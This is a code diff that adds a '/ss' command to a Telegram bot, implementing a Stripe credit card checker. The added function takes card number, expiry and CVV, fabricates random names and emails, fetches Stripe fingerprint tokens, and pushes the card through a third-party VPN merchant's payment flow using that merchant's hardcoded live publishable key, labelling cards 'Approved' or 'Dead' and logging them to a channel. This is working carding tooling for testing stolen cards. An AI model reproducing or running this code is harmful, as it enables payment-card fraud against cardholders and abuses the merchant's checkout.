@@ -684,6 +684,182 @@ async def txt_chk_handler(client: Client, message: Message):
             os.remove(file_path)
         if 'result_filename' in locals() and os.path.exists(result_filename):
             os.remove(result_filename)        
+            
+async def stripe_checker(cc, mes, ano, cvv, user_id, firstname):
+    try:
+        # Generate random user details
+        zip_code = random.randint(10001, 90045)
+        time_on_page = random.randint(30000, 699999)
+        rand_num = random.randint(0, 99999)
+        email = f"{random_string(7)}{rand_num}@gmail.com"
+        first_name = random_string(7)
+        last_name = random_string(7)
+        
+        # First request to get muid, sid, guid
+        session = requests.Session()
+        headers = {
+            'Host': 'm.stripe.com',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Content-Type': 'text/plain;charset=UTF-8',
+            'Origin': 'https://m.stripe.network',
+            'Referer': 'https://m.stripe.network/inner.html'
+        }
+        
+        # First request to get tokens
+        res1 = session.get('https://m.stripe.com/6', headers=headers)
+        muid = capture(res1.text, '"muid":"', '"')
+        sid = capture(res1.text, '"sid":"', '"')
+        guid = capture(res1.text, '"guid":"', '"')
+        
+        # Get BIN info
+        bin_code = cc[:6]
+        bin_info = get_bin_info(bin_code)
+        
+        # Prepare payment method request
+        headers = {
+            'Host': 'api.stripe.com',
+            'Accept': 'application/json',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'Origin': 'https://js.stripe.com',
+            'Referer': 'https://js.stripe.com/',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
+        }
+        
+        data = {
+            'type': 'card',
+            'card[number]': cc,
+            'card[cvc]': cvv,
+            'card[exp_month]': mes,
+            'card[exp_year]': ano,
+            'billing_details[address][postal_code]': zip_code,
+            'guid': guid,
+            'muid': muid,
+            'sid': sid,
+            'payment_user_agent': 'stripe.js/c478317df; stripe-js-v3/c478317df',
+            'time_on_page': time_on_page,
+            'referrer': 'https://atlasvpn.com/',
+            'key': 'pk_live_woOdxnyIs6qil8ZjnAAzEcyp00kUbImaXf'
+        }
+        
+        # Make payment method request
+        start_time = time.time()
+        res2 = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+        elapsed = time.time() - start_time
+        
+        if 'error' in res2.text.lower():
+            error_msg = capture(res2.text, '"message": "', '"')
+            status = "Dead ❌"
+            response = error_msg
+        else:
+            payment_id = capture(res2.text, '"id": "', '"')
+            
+            # Make payment request
+            headers = {
+                'Accept': 'application/json, text/plain, */*',
+                'Accept-Language': 'en-US,en;q=0.9',
+                'content-type': 'application/json;charset=UTF-8',
+                'Host': 'user.atlasvpn.com',
+                'Origin': 'https://atlasvpn.com',
+                'Referer': 'https://atlasvpn.com/',
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
+            }
+            
+            payload = {
+                "email": email,
+                "name": f"{first_name} {last_name}",
+                "payment_method_id": payment_id,
+                "identifier": "com.atlasvpn.vpn.subscription.p1m.stripe_regular_2",
+                "currency": "USD",
+                "postal_code": zip_code
+            }
+            
+            res3 = session.post('https://user.atlasvpn.com/v1/stripe/pay', headers=headers, json=payload)
+            
+            if 'client_secret' in res3.text:
+                status = "CVV or CCN ✅"
+                response = "Approved"
+            else:
+                error_code = capture(res3.text, '"code":"', '"')
+                status = "Dead ❌"
+                response = error_code if error_code else "Declined"
+        
+        # Prepare response
+        result_text = (
+            f"<b>Card:</b> <code>{cc}|{mes}|{ano}|{cvv}</code>\n"
+            f"<b>Status -» {status}\n"
+            f"Response -» {response}\n"
+            f"Gateway -» Stripe Auth 1\n"
+            f"Time -» <b>{elapsed:.2f}</b><b>s</b>\n\n"
+            f"------- Bin Info -------</b>\n"
+            f"<b>Bank -»</b> {bin_info[1]}\n"
+            f"<b>Brand -»</b> {bin_info[0]}\n"
+            f"<b>Type -»</b> {bin_info[2]}\n"
+            f"<b>Currency -»</b> USD\n"
+            f"<b>Country -»</b> {bin_info[3]}\n"
+            f"<b>----------------------------</b>\n\n"
+            f"<b>Checked By <a href='tg://user?id={user_id}'>{firstname}</a></b>\n"
+            f"<b>Bot By: <a href='t.me/andr0idpie9'>ANDROID PIE</a></b>"
+        )
+        
+        return result_text
+        
+    except Exception as e:
+        logging.error(f"Stripe checker error: {e}")
+        return f"Error processing card: {str(e)}"
+
+def capture(text, start, end):
+    try:
+        return text.split(start)[1].split(end)[0]
+    except:
+        return ""
+
+def random_string(length):
+    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(length))
+
+@app.on_message(filters.command("ss", prefixes="/"))
+async def ss_handler(client: Client, message: Message):
+    try:
+        # Check if user provided CC
+        if len(message.text.split()) < 2:
+            await message.reply("<b>Please provide a CC to check in format: /ss 4111111111111111|12|25|123</b>", parse_mode="html")
+            return
+        
+        # Parse CC details
+        lista = message.text.split()[1]
+        if not re.match(r"\d{16}\|\d{2}\|\d{2,4}\|\d{3}", lista):
+            await message.reply("<b>Invalid CC format. Use: /ss 4111111111111111|12|25|123</b>", parse_mode="html")
+            return
+            
+        parts = lista.split("|")
+        cc = parts[0]
+        mes = parts[1]
+        ano = parts[2]
+        cvv = parts[3]
+        
+        # Send initial processing message
+        proc_msg = await message.reply("<b>Wait for Result...</b>", parse_mode="html")
+        
+        # Perform the check
+        result = await stripe_checker(cc, mes, ano, cvv, message.from_user.id, message.from_user.first_name)
+        
+        # Edit message with result
+        await proc_msg.edit(result, parse_mode="html", disable_web_page_preview=True)
+        
+        # Log to channel
+        await log_to_channel(
+            client, 
+            "CC", 
+            message, 
+            lista, 
+            "Approved" if "CVV or CCN ✅" in result else "Declined"
+        )
+        
+    except Exception as e:
+        logging.error(f"SS handler error: {e}")
+        await message.reply(f"Error processing request: {str(e)}")            
         
 if __name__ == "__main__":
     print("🚀 Combined Bot is running with /ai, /chk and /gen commands...")
